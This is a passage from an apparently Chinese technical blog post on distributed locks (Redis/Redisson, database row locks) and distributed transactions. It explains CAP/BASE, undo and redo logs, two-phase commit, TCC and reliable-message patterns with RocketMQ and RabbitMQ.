&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisLock <span class="title function_">getReentrantLock</span><span class="params">(String key)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReentrantRedisLock</span>(redisTemplate, key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Redisson"><a href="#Redisson" class="headerlink" title="Redisson"></a>Redisson</h3><h4 id="锁自动续期"><a href="#锁自动续期" class="headerlink" title="锁自动续期"></a>锁自动续期</h4><p>锁如果在执行任务时自动过期，就会引起各种问题， 因此我们需要在锁过期前自动申请续期，这个被称为watch dog，看门狗。</p>
<h4 id="带阻塞的获取锁"><a href="#带阻塞的获取锁" class="headerlink" title="带阻塞的获取锁"></a>带阻塞的获取锁</h4><p>阻塞获取锁, 会在获取失败以后重试, 不过会设置失败超时时间;</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>优点: 实现简单,性能好, 并发能力强,如果对并发能力有要求, 推荐使用</p>
<p>缺点: 可靠性有争议, 极端情况下会出现锁失效问题, 如果对安全要求较高, 不建议使用</p>
<h2 id="Zookeeper实现分布式锁"><a href="#Zookeeper实现分布式锁" class="headerlink" title="Zookeeper实现分布式锁"></a>Zookeeper实现分布式锁</h2><h2 id="基于数据库实现"><a href="#基于数据库实现" class="headerlink" title="基于数据库实现"></a>基于数据库实现</h2><p>准备一张表，记录锁相关信息:<code>tb_lock</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id	method_name</span><br><span class="line">1	createOrder</span><br><span class="line">2	evictOrder</span><br></pre></td></tr></table></figure>



<p>互斥：利用了数据库本身的排它锁来实现。</p>
<p>步骤：</p>
<ul>
<li>获取锁：select * from tb_lock where method_name &#x3D; “evictOrder” for update</li>
<li>执行自己的业务 …</li>
<li>释放锁：commit 提交事务</li>
</ul>
<p>优点：</p>
<ul>
<li>实现简单</li>
<li>锁的自动释放</li>
</ul>
<p>缺点：</p>
<ul>
<li>依赖于数据库，性能是一个问题</li>
<li>单点故障问题</li>
<li>并发一般</li>
</ul>
<h1 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h1><h2 id="什么是分布式事务"><a href="#什么是分布式事务" class="headerlink" title="什么是分布式事务?"></a>什么是分布式事务?</h2><h3 id="本地事务"><a href="#本地事务" class="headerlink" title="本地事务"></a>本地事务</h3><p>事务: 是指传统的单机数据库事务,必须具备ACID原则; 在传统的项目中,项目的部署基本是单点式: 即单个服务器和单个数据库. 这种情况下数据库本身的事务机制就能保证ACID原则,这样的事务就是本地事务. 单个服务和单个数据库的架构中,产生的事务都是本地事务.</p>
<h3 id="分布式事务-1"><a href="#分布式事务-1" class="headerlink" title="分布式事务"></a>分布式事务</h3><p>跨数据源的分布式事务, 跨服务的分布式事务</p>
<h4 id="跨数据源"><a href="#跨数据源" class="headerlink" title="跨数据源"></a>跨数据源</h4><p>对数据库进行了水平拆分,将原单库单表拆分成数据库分片,于是产生了跨数据库事务问题</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149742.png" alt="image-20210415144156443"></p>
<h4 id="跨服务"><a href="#跨服务" class="headerlink" title="跨服务"></a>跨服务</h4><p>在业务发展初期，“一块大饼”的单业务系统架构，能满足基本的业务需求。但是随着业务的快速发展，系统的访问量和业务复杂程度都在快速增长，单系统架构逐渐成为业务发展瓶颈，解决业务系统的高耦合、可伸缩问题的需求越来越强烈。</p>
<p>如下图所示，按照面向服务（SOA,SOA粗暴理解：把系统按照实际业务，拆分成刚刚好大小的、合适的、独立部署的模块，每个模块之间相互独立。）的架构的设计原则，将单业务系统拆分成多个业务系统，降低了各系统之间的耦合度，使不同的业务系统专注于自身业务，更有利于业务的发展和系统容量的伸缩。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149743.png" alt="image-20210415144342697"></p>
<h4 id="分布式系统的数据一致性问题"><a href="#分布式系统的数据一致性问题" class="headerlink" title="分布式系统的数据一致性问题"></a>分布式系统的数据一致性问题</h4><p>在数据库水平拆分、服务垂直拆分之后，一个业务操作通常要跨多个数据库、服务才能完成。在分布式网络环境下，我们无法保障所有服务、数据库都百分百可用，一定会出现部分服务、数据库执行成功，另一部分执行失败的问题。</p>
<p>当出现部分业务操作成功、部分业务操作失败时，业务数据就会出现不一致。</p>
<p>例如电商行业中比较常见的下单付款案例，包括下面几个行为：</p>
<ul>
<li>创建新订单</li>
<li>扣减商品库存</li>
<li>从用户账户余额扣除金额</li>
</ul>
<p>完成上面的操作需要访问三个不同的微服务和三个不同的数据库。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149744.png" alt="image-20200304204442839"></p>
<p>在分布式环境下，肯定会出现部分操作成功、部分操作失败的问题，比如：订单生成了，库存也扣减了，但是 用户账户的余额不足，这就造成数据不一致。</p>
<p>订单的创建、库存的扣减、账户扣款在每一个服务和数据库内是一个本地事务，可以保证ACID原则。</p>
<p>但是当我们把三件事情看做一个事情事，要满足保证“业务”的原子性，要么所有操作全部成功，要么全部失败，不允许出现部分成功部分失败的现象，这就是分布式系统下的事务了。</p>
<p>此时ACID难以满足，这是分布式事务要解决的问题</p>
<h2 id="解决分布式事务的思路"><a href="#解决分布式事务的思路" class="headerlink" title="解决分布式事务的思路"></a>解决分布式事务的思路</h2><h3 id="CAP定理"><a href="#CAP定理" class="headerlink" title="CAP定理"></a>CAP定理</h3><p>Consistency(一致性), Availability(可用性), Partition Tolerance(分区容错性); 这个三个指标不可能同时完成, 这个结论就叫做CAP定理;</p>
<p>舍弃容错性。但是这也就意味着你的系统不是分布式的了，因为涉及分布式的想法就是把功能分开，部署到不同的机器上。</p>
<h3 id="Base理论"><a href="#Base理论" class="headerlink" title="Base理论"></a>Base理论</h3><p>Basically Available(基本可用), Soft state(软状态), Eventually consistent(最终一致性)</p>
<h4 id="基本可用"><a href="#基本可用" class="headerlink" title="基本可用"></a>基本可用</h4><p><strong>响应时间上的损失</strong>：正常情况下的搜索引擎0.5秒即返回给用户结果，而基本可用的搜索引擎可以在2秒作用返回结果。</p>
<p><strong>功能上的损失</strong>：在一个电商网站上，正常情况下，用户可以顺利完成每一笔订单。但是到了大促期间，为了保护购物系统的稳定性，部分消费者可能会被引导到一个降级页面。</p>
<h4 id="软状态"><a href="#软状态" class="headerlink" title="软状态"></a>软状态</h4><p>什么是软状态呢？相对于原子性而言，要求多个节点的数据副本都是一致的，这是一种“硬状态”。</p>
<p>软状态指的是：允许系统中的数据存在中间状态，并认为该状态不影响系统的整体可用性，即允许系统在多个不同节点的数据副本存在数据延时。</p>
<h4 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h4><p>上面说软状态，然后不可能一直是软状态，必须有个时间期限。在期限过后，应当保证所有副本保持数据一致性，从而达到数据的最终一致性。这个时间期限取决于网络延时、系统负载、数据复制方案设计等等因素。</p>
<p>而在实际工程实践中，最终一致性分为5种：</p>
<p>因果一致性（Causal consistency）</p>
<p>因果一致性指的是：如果节点A在更新完某个数据后通知了节点B，那么节点B之后对该数据的访问和修改都是基于A更新后的值。于此同时，和节点A无因果关系的节点C的数据访问则没有这样的限制。</p>
<p>读己之所写（Read your writes）</p>
<p>读己之所写指的是：节点A更新一个数据后，它自身总是能访问到自身更新过的最新值，而不会看到旧值。其实也算一种因果一致性。</p>
<p>会话一致性（Session consistency）</p>
<p>会话一致性将对系统数据的访问过程框定在了一个会话当中：系统能保证在同一个有效的会话中实现 “读己之所写” 的一致性，也就是说，执行更新操作之后，客户端能够在同一个会话中始终读取到该数据项的最新值。</p>
<p>单调读一致性（Monotonic read consistency）</p>
<p>单调读一致性指的是：如果一个节点从系统中读取出一个数据项的某个值后，那么系统对于该节点后续的任何数据访问都不应该返回更旧的值。</p>
<p>单调写一致性（Monotonic write consistency）</p>
<p>单调写一致性指的是：一个系统要能够保证来自同一个节点的写操作被顺序的执行。</p>
<p>在实际的实践中，这5种系统往往会结合使用，以构建一个具有最终一致性的分布式系统。</p>
<p>实际上，不只是分布式系统使用最终一致性，关系型数据库在某个功能上，也是使用最终一致性的。比如备份，数据库的复制过程是需要时间的，这个复制过程中，业务读取到的值就是旧的。当然，最终还是达成了数据一致性。这也算是一个最终一致性的经典案例。</p>
<p>小结</p>
<p>总体来说BASE理论面向的是大型高可用、可扩展的分布式系统。与传统ACID特性相反，不同于ACID的强一致性模型，BASE提出通过牺牲强一致性来获得可用性，并允许数据段时间内的不一致，但是最终达到一致状态。同时，在实际分布式场景中，不同业务对数据的一致性要求不一样。因此在设计中，ACID和BASE理论往往又会结合使用。</p>
<p>而我们解决分布式事务，就是根据Base理论和CAP理论来实现。</p>
<p>还以上面的下单减库存和扣款为例：</p>
<p>订单服务、库存服务、用户服务及他们对应的数据库就是分布式应用中的三个部分。</p>
<ul>
<li><p>CP方式：现在如果要满足事务的强一致性，就必须在订单服务数据库锁定的同时，对库存服务、用户服务数据资源同时锁定。等待三个服务业务全部处理完成，才可以释放资源。此时如果有其他请求想要操作被锁定的资源就会被阻塞，这样就是满足了CP。</p>
<p>这就是强一致，弱可用</p>
</li>
<li><p>AP方式：三个服务的对应数据库各自独立执行自己的业务，执行本地事务，不要求互相锁定资源。但是这个中间状态下，我们去访问数据库，可能遇到数据不一致的情况，不过我们需要做一些后补措施，保证在经过一段时间后，数据最终满足一致性。</p>
<p>这就是高可用，但弱一致（最终一致）。</p>
</li>
</ul>
<p>由上面的两种思想，延伸出了很多的分布式事务解决方案：</p>
<ul>
<li>XA</li>
<li>TCC</li>
<li>可靠消息最终一致</li>
<li>TA</li>
</ul>
<p>不过，要想搞懂这些原理，你必须知道数据库本地事务是如何实现的，也就是undo和redo日志的故事。</p>
<h3 id="undo和redo"><a href="#undo和redo" class="headerlink" title="undo和redo"></a>undo和redo</h3><p>在数据库系统中，既有存放数据的文件，也有存放日志的文件。日志在内存中也是有缓存Log buffer，也有磁盘文件log file。MySQL中的日志文件，有这么两类与事务有关：undo日志与redo日志。</p>
<h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>持久性和原子性可以利用undo log来实现</p>
<p>原理: 为了满足事务的原子性,在操作任何数据之前,首先将数据备份到undo log. 然后进行数据的修改. 如果出现了错误或者用户执行了ROLLBACK语句,系统可以利用Undo log 中的备份数据将数据恢复到事务开始之前的状态.</p>
<p>数据库写入数据到磁盘之前, 会把数据先缓存在内存中,事务提交时才会写入磁盘中.</p>
<p>用undo log 实现原子性和持久性的事务的简化过程: </p>
<p>假设有A、B两个数据,值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log buffer.<br> C. 修改A&#x3D;3.<br> D. 记录B&#x3D;2到undo log buffer.<br> E. 修改B&#x3D;4.<br> F. 将undo log buffer写到磁盘。<br> G. 将数据写到磁盘。<br> H. 事务提交</p>
<ul>
<li><p>如何保证原子性？</p>
<p>在修改数据到磁盘前，会先记录undo log，并将undo log持久化到硬盘</p>
</li>
<li><p>如何保证持久性？</p>
<p>在事务提交之前，把内存中缓存的数据写入磁盘。这样事务提交时，可以确定数据是已经持久化的，不会丢失。</p>
</li>
<li><p>若系统在G和H之间崩溃</p>
<p>此时事务并未提交，需要回滚。而undo log已经被持久化，可以根据undo log来恢复数据</p>
</li>
<li><p>若系统在G之前崩溃</p>
<p>此时数据并未持久化到硬盘，依然保持在事务之前的状态</p>
</li>
</ul>
<p><strong>缺陷：</strong>每个事务提交前将数据和Undo Log写入磁盘，这样会导致大量的磁盘IO，因此性能很低。</p>
<p>如果能够将数据缓存一段时间，就能减少IO提高性能。但是这样就会丧失事务的持久性。因此引入了另外一种机制来实现持久化，即<strong>Redo Log</strong>.</p>
<h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>和Undo Log相反，Redo Log记录的是<strong>新数据</strong>的备份。<strong>在事务提交前，只要将Redo Log持久化即可，不需要将数据持久化，减少了IO的次数。</strong></p>
<p>先来看下基本原理：</p>
<blockquote>
<p><strong>Undo + Redo事务的简化过程</strong></p>
</blockquote>
<p> 假设有A、B两个数据，值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log.<br> C. 修改A&#x3D;3.<br> D. 记录A&#x3D;3到redo log.<br> E. 记录B&#x3D;2到undo log.<br> F. 修改B&#x3D;4.<br> G. 记录B&#x3D;4到redo log.<br> H. 将undo log写入redo log<br> I. 将redo log写入磁盘<br> J. 事务提交</p>
<blockquote>
<p>安全和性能问题</p>
</blockquote>
<ul>
<li><p>如何保证原子性？</p>
<p>如果在事务提交前故障，通过undo log日志恢复数据。如果undo log都还没写入，那么数据就尚未持久化，无需回滚</p>
</li>
<li><p>如何保证持久化？</p>
<p>大家会发现，这里并没有出现数据的持久化。因为数据已经写入redo log，而redo log持久化到了硬盘，因此只要到了I以后，事务是可以提交的。</p>
</li>
<li><p>内存中的数据库数据何时持久化到磁盘？</p>
<p>因为redo log已经持久化，因此数据库数据写入磁盘与否影响不大，不过为了避免出现脏数据（内存中与磁盘不一致），事务提交后也会将内存数据刷入磁盘（也可以按照固设定的频率刷新内存数据到磁盘中）。</p>
</li>
<li><p>持久化redo和持久化数据库数据有什么性能差异？</p>
<ul>
<li><p>数据库数据写入是随机IO，性能很差</p>
</li>
<li><p>redo log在初始化时会开辟一段连续的空间，写入是顺序IO，性能很好</p>
</li>
</ul>
</li>
<li><p>redo log中记录的数据，有可能尚未提交，那么如何完成数据恢复？</p>
<p>数据恢复有两种策略：</p>
<ul>
<li>恢复时，只重做已经提交了的事务</li>
<li>恢复时，重做所有事务包括未提交的事务和回滚了的事务。然后通过Undo Log回滚那些未提交的事务</li>
</ul>
<p>Inodb引擎采用的是第二种方案，因此undo log要在 redo log前持久化</p>
</li>
<li><p>写入性能的优化</p>
<p>事务提交前需要同时写入undo log和 redo log，势必增加IO次数，因此实际上undo log并不是直接写入磁盘，而是先写入到redo log中，当redo log持久化时，undo log就同时持久化到硬盘了。</p>
<p>因此事务提交前，只需要对redo log持久化即可。</p>
<p>另外，redo log并不是写入一次就持久化一次，redo log在内存中也有自己的缓冲池：<code>redo log buffer</code>。每次写redo log都是写入到buffer，在提交时一次性持久化到磁盘，减少IO此时。</p>
</li>
</ul>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>最后总结一下：</p>
<ul>
<li>undo log 记录更新前数据，用于保证事务原子性</li>
<li>redo log 记录更新后数据，用于保证事务的持久性</li>
<li>redo log有自己的内存buffer，先写入到buffer，事务提交时写入磁盘</li>
<li>redo log持久化之后，意味着事务是<strong>可提交</strong>的</li>
</ul>
<h3 id="分阶段提交"><a href="#分阶段提交" class="headerlink" title="分阶段提交"></a>分阶段提交</h3><h4 id="DTP和XA"><a href="#DTP和XA" class="headerlink" title="DTP和XA"></a>DTP和XA</h4><p>分布式事务的解决手段之一，就是两阶段提交协议（2PC：Two-Phase Commit）</p>
<p>那么到底什么是两阶段提交协议呢？</p>
<p>1994 年，X&#x2F;Open 组织（即现在的 Open Group ）定义了分布式事务处理的DTP 模型。该模型包括这样几个角色：</p>
<ul>
<li>应用程序（ AP,Application ）：我们的微服务</li>
<li>事务管理器（ TM, Transction Manager）：全局事务管理者</li>
<li>资源管理器（ RM, Resource Manager ）：一般是数据库</li>
<li>通信资源管理器（ CRM, Communication Resource Manager）：是TM和RM间的通信中间件</li>
</ul>
<p>在该模型中，一个分布式事务（全局事务）可以被拆分成许多个本地事务，运行在不同的AP和RM上。每个本地事务的ACID很好实现，但是全局事务必须保证其中包含的每一个本地事务都能同时成功，若有一个本地事务失败，则所有其它事务都必须回滚。但问题是，本地事务处理过程中，并不知道其它事务的运行状态。因此，就需要通过CRM来通知各个本地事务，同步事务执行的状态。</p>
<p>因此，各个本地事务的通信必须有统一的标准，否则不同数据库间就无法通信。<strong>XA</strong>就是 X&#x2F;Open DTP中通信中间件与TM间联系的<strong>接口规范</strong>，定义了用于通知事务开始、提交、终止、回滚等接口，各个数据库厂商都必须实现这些接口。</p>
<h4 id="二阶段提交"><a href="#二阶段提交" class="headerlink" title="二阶段提交"></a>二阶段提交</h4><p>2PC：Two-Phase(feis) Commit）</p>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/35298019">漫话分布式系统共识协议: 2PC&#x2F;3PC篇</a></p>
<p><strong>二阶提交协议</strong>就是根据这一思想衍生出来的，将全局事务拆分为两个阶段来执行：</p>
<ul>
<li>阶段一：准备阶段，各个本地事务完成本地事务的准备工作。</li>
<li>阶段二：执行阶段，各个本地事务根据上一阶段执行结果，进行提交或回滚。</li>
</ul>
<p>这个过程中需要一个协调者（coordinator），还有事务的参与者（voter）。</p>
<blockquote>
<p>1）正常情况</p>
</blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149745.png" alt="image-20200305141029973"> </p>
<p><strong>投票阶段</strong>：协调组询问各个事务参与者，是否可以执行事务。每个事务参与者执行事务，写入redo和undo日志，然后反馈事务执行成功的信息（<code>agree</code>）</p>
<p><strong>提交阶段</strong>：协调组发现每个参与者都可以执行事务（<code>agree</code>），于是向各个事务参与者发出<code>commit</code>指令，各个事务参与者提交事务。</p>
<blockquote>
<p>2）异常情况</p>
</blockquote>
<p>当然，也有异常的时候：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149746.png" alt="image-20200305141318326"> </p>
<p><strong>投票阶段</strong>：协调组询问各个事务参与者，是否可以执行事务。每个事务参与者执行事务，写入redo和undo日志，然后反馈事务执行结果，但只要有一个参与者返回的是<code>Disagree</code>，则说明执行失败。</p>
<p><strong>提交阶段</strong>：协调组发现有一个或多个参与者返回的是<code>Disagree</code>，认为执行失败。于是向各个事务参与者发出<code>abort</code>指令，各个事务参与者回滚事务。</p>
<blockquote>
<p>3）缺陷</p>
</blockquote>
<p>二阶段提交的问题：</p>
<ul>
<li><p>单点故障问题</p>
<p>2PC的缺点在于不能处理fail-stop形式的节点failure. 比如下图这种情况.</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149747.png" alt="image-20200305142812815"> </p>
<p>假设coordinator和voter3都在Commit这个阶段crash了, 而voter1和voter2没有收到commit消息. 这时候voter1和voter2就陷入了一个困境. 因为他们并不能判断现在是两个场景中的哪一种:</p>
<p> (1)上轮全票通过然后voter3第一个收到了commit的消息并在commit操作之后crash了</p>
<p> (2)上轮voter3反对所以干脆没有通过.</p>
</li>
<li><p>阻塞问题</p>
<p>在准备阶段、提交阶段，每个事物参与者都会锁定本地资源，并等待其它事务的执行结果，阻塞时间较长，资源锁定时间太久，因此执行的效率就比较低了。</p>
</li>
</ul>
<p>面对二阶段提交的上述缺点，后来又演变出了三阶段提交，但是依然没有完全解决阻塞和资源锁定的问题，而且引入了一些新的问题，因此实际使用的场景较少。对事务有强一致性要求,对事务的执行效率不敏感,并且不希望有太多的代码侵入.</p>
<h3 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h3><p>Try-confirm-cancel</p>
<p>TCC模式可以解决2PC中的资源锁定和阻塞问题，减少资源锁定时间。它采用的是一种补偿型事务的思想。</p>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>它本质是一种补偿的思路。事务运行过程包括三个方法，</p>
<ul>
<li>Try：资源的检测和预留；</li>
<li>Confirm：执行的业务操作提交；要求 Try 成功 Confirm 一定要能成功；</li>
<li>Cancel：预留资源释放。</li>
</ul>
<p>执行分两个阶段：</p>
<ul>
<li>准备阶段（try）：资源的检测和预留；</li>
<li>执行阶段（confirm&#x2F;cancel）：根据上一步结果，判断下面的执行方法。如果上一步中所有事务参与者都成功，则这里执行confirm。反之，执行cancel</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149748.png" alt="image-20200305155521612"> </p>
<p>粗看似乎与两阶段提交没什么区别，但其实差别很大：</p>
<ul>
<li>try、confirm、cancel都是独立的事务，不受其它参与者的影响，不会阻塞等待它人</li>
<li>try、confirm、cancel由程序员在业务层编写，锁粒度有代码控制</li>
</ul>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>我们以之前的下单业务中的扣减余额为例来看下三个不同的方法要怎么编写，假设账户A原来余额是100，需要余额扣减30元。如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149749.png" alt="image-20200305155830732"></p>
<ul>
<li><p>一阶段（Try）：余额检查，并冻结用户部分金额，此阶段执行完毕，事务已经提交</p>
<ul>
<li>检查用户余额是否充足，如果充足，冻结部分余额</li>
<li>在账户表中添加冻结金额字段，值为30，余额不变</li>
</ul>
</li>
<li><p>二阶段</p>
<ul>
<li>提交（Confirm）：真正的扣款，把冻结金额从余额中扣除，冻结金额清空<ul>
<li>修改冻结金额为0，修改余额为100-30 &#x3D; 70元</li>
</ul>
</li>
<li>补偿（Cancel）：释放之前冻结的金额，并非回滚<ul>
<li>余额不变，修改账户冻结金额为0</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="优势和缺点"><a href="#优势和缺点" class="headerlink" title="优势和缺点"></a>优势和缺点</h4><ul>
<li><p>优势</p>
<p>TCC执行的每一个阶段都会提交本地事务并释放锁，并不需要等待其它事务的执行结果。而如果其它事务执行失败，最后不是回滚，而是执行补偿操作。这样就避免了资源的长期锁定和阻塞等待，执行效率比较高，属于性能最好的分布式事务方式。</p>
</li>
<li><p>缺点</p>
<ul>
<li>代码侵入：需要人为编写代码实现，代码侵入较多</li>
<li>开发成本高：一个业务需要拆分成3个步骤，分别编写业务实现，业务编写比较复杂</li>
<li>安全性考虑：cancel动作如果执行失败，资源就无法释放，需要引入重试机制，而重试可能导致重复执行，还要考虑重试时的幂等问题</li>
</ul>
</li>
</ul>
<h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>对事务有一定的一致性要求(最终一致); 对性能要求较高; 开发人员需要具备较高的编码能力和幂等处理经验;</p>
<h3 id="可靠消息服务"><a href="#可靠消息服务" class="headerlink" title="可靠消息服务"></a>可靠消息服务</h3><p>这种实现方式的思路，其实是源于ebay，其基本的设计思想是将远程分布式事务拆分成一系列的本地事务。</p>
<h4 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h4><p>一般分为事务的发起者A和事务的其它参与者B：</p>
<ul>
<li>事务发起者A执行本地事务</li>
<li>事务发起者A通过MQ将需要执行的事务信息发送给事务参与者B</li>
<li>事务参与者B接收到消息后执行本地事务</li>
</ul>
<p>如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149750.png" alt="image-20200305181454125"></p>
<p>这个过程有点像你去学校食堂吃饭：</p>
<ul>
<li>拿着钱去收银处，点一份红烧牛肉面，付钱</li>
<li>收银处给你发一个小票，还有一个号牌，你别把票弄丢！</li>
<li>你凭小票和号牌一定能领到一份红烧牛肉面，不管需要多久</li>
</ul>
<p>几个注意事项：</p>
<ul>
<li>事务发起者A必须确保本地事务成功后，消息一定发送成功</li>
<li>MQ必须保证消息正确投递和持久化保存</li>
<li>事务参与者B必须确保消息最终一定能消费，如果失败需要多次重试</li>
<li>事务B执行失败，会重试，但不会导致事务A回滚</li>
</ul>
<p>那么问题来了，我们如何保证消息发送一定成功？如何保证消费者一定能收到消息？</p>
<h4 id="本地消息表"><a href="#本地消息表" class="headerlink" title="本地消息表"></a>本地消息表</h4><p>为了避免消息发送失败或丢失，我们可以把消息持久化到数据库中。实现时有简化版本和解耦合版本两种方式。</p>
<h5 id="简化版本"><a href="#简化版本" class="headerlink" title="简化版本"></a>简化版本</h5><p>原理图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149751.png" alt="image-20200305183431211"> </p>
<ul>
<li><p>事务发起者：</p>
<ul>
<li>开启本地事务</li>
<li>执行事务相关业务</li>
<li>发送消息到MQ</li>
<li>把消息持久化到数据库，标记为已发送</li>
<li>提交本地事务</li>
</ul>
</li>
<li><p>事务接收者：</p>
<ul>
<li>接收消息</li>
<li>开启本地事务</li>
<li>处理事务相关业务</li>
<li>修改数据库消息状态为已消费</li>
<li>提交本地事务</li>
</ul>
</li>
<li><p>额外的定时任务</p>
<ul>
<li>定时扫描表中超时未消费消息，重新发送</li>
</ul>
</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>与tcc相比，实现方式较为简单，开发成本低。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><p>数据一致性完全依赖于消息服务，因此消息服务必须是可靠的。</p>
</li>
<li><p>需要处理被动业务方的幂等问题</p>
</li>
<li><p>被动业务失败不会导致主动业务的回滚，而是重试被动的业务</p>
</li>
<li><p><strong>事务业务与消息发送业务耦合</strong>、业务数据与消息表要在一起</p>
</li>
</ul>
<h5 id="独立消息服务"><a href="#独立消息服务" class="headerlink" title="独立消息服务"></a>独立消息服务</h5><p>为了解决上述问题，我们会引入一个独立的消息服务，来完成对消息的持久化、发送、确认、失败重试等一系列行为，大概的模型如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149752.png" alt="image-20200305200131083"></p>
<p>一次消息发送的时序图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149753.png" alt="image-20200305205430863"></p>
<p>事务发起者A的基本执行步骤：</p>
<ul>
<li>开启本地事务</li>
<li>通知消息服务，准备发送消息（消息服务将消息持久化，标记为准备发送）</li>
<li>执行本地业务，<ul>
<li>执行失败则终止，通知消息服务，取消发送（消息服务修改订单状态）</li>
<li>执行成功则继续，通知消息服务，确认发送（消息服务发送消息、修改订单状态）</li>
</ul>
</li>
<li>提交本地事务</li>
</ul>
<p>消息服务本身提供下面的接口：</p>
<ul>
<li>准备发送：把消息持久化到数据库，并标记状态为准备发送</li>
<li>取消发送：把数据库消息状态修改为取消</li>
<li>确认发送：把数据库消息状态修改为确认发送。尝试发送消息，成功后修改状态为已发送</li>
<li>确认消费：消费者已经接收并处理消息，把数据库消息状态修改为已消费</li>
<li>定时任务：定时扫描数据库中状态为确认发送的消息，然后询问对应的事务发起者，事务业务执行是否成功，结果：<ul>
<li>业务执行成功：尝试发送消息，成功后修改状态为已发送</li>
<li>业务执行失败：把数据库消息状态修改为取消</li>
</ul>
</li>
</ul>
<p>事务参与者B的基本步骤：</p>
<ul>
<li>接收消息</li>
<li>开启本地事务</li>
<li>执行业务</li>
<li>通知消息服务，消息已经接收和处理</li>
<li>提交事务</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>解除了事务业务与消息相关业务的耦合</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>实现起来比较复杂</li>
</ul>
<h4 id="RocketMQ事务消息"><a href="#RocketMQ事务消息" class="headerlink" title="RocketMQ事务消息"></a>RocketMQ事务消息</h4><p>RocketMQ本身自带了事务消息，可以保证消息的可靠性，原理其实就是自带了本地消息表，与我们上面讲的思路类似。</p>
<h4 id="RabbitMQ的消息确认"><a href="#RabbitMQ的消息确认" class="headerlink" title="RabbitMQ的消息确认"></a>RabbitMQ的消息确认</h4><p>RabbitMQ确保消息不丢失的思路比较奇特，并没有使用传统的本地表，而是利用了消息的确认机制：</p>
<ul>
<li>生产者确认机制：确保消息从生产者到达MQ不会有问题<ul>
<li>消息生产者发送消息到RabbitMQ时，可以设置一个异步的监听器，监听来自MQ的ACK</li>
<li>MQ接收到消息后，会返回一个回执给生产者：<ul>
<li>消息到达交换机后路由失败，会返回失败ACK</li>
<li>消息路由成功，持久化失败，会返回失败ACK</li>
<li>消息路由成功，持久化成功，会返回成功ACK</li>
</ul>
</li>
<li>生产者提前编写好不同回执的处理方式<ul>
<li>失败回执：等待一定时间后重新发送</li>
<li>成功回执：记录日志等行为</li>
</ul>
</li>
</ul>
</li>
<li>消费者确认机制：确保消息能够被消费者正确消费<ul>
<li>消费者需要在监听队列的时候指定手动ACK模式</li>
<li>RabbitMQ把消息投递给消费者后，会等待消费者ACK，接收到ACK后才删除消息，如果没有接收到ACK消息会一直保留在服务端，如果消费者断开连接或异常后，消息会投递给其它消费者。</li>
<li>消费者处理完消息，提交事务后，手动ACK。如果执行过程中抛出异常，则不会ACK，业务处理失败，等待下一条消息</li>
</ul>
</li>
</ul>
<p>经过上面的两种确认机制，可以确保从消息生产者到消费者的消息安全，再结合生产者和消费者两端的本地事务，即可保证一个分布式事务的最终一致性。</p>
<h4 id="消息事务的优缺点"><a href="#消息事务的优缺点" class="headerlink" title="消息事务的优缺点"></a>消息事务的优缺点</h4><p>总结上面的几种模型，消息事务的优缺点如下：</p>
<ul>
<li>优点：<ul>
<li>相对TCC，代码侵入较少</li>
<li>业务相对简单</li>
<li>是多个本地事务的结合，因此资源锁定周期短，性能好</li>
</ul>
</li>
<li>缺点：<ul>
<li>依赖于MQ的可靠性</li>
<li>消息发起者可以回滚，但是消息参与者无法引起事务回滚</li>
<li>事务时效性差，取决于MQ消息发送是否及时，还有消息参与者的执行情况</li>
</ul>
</li>
</ul>
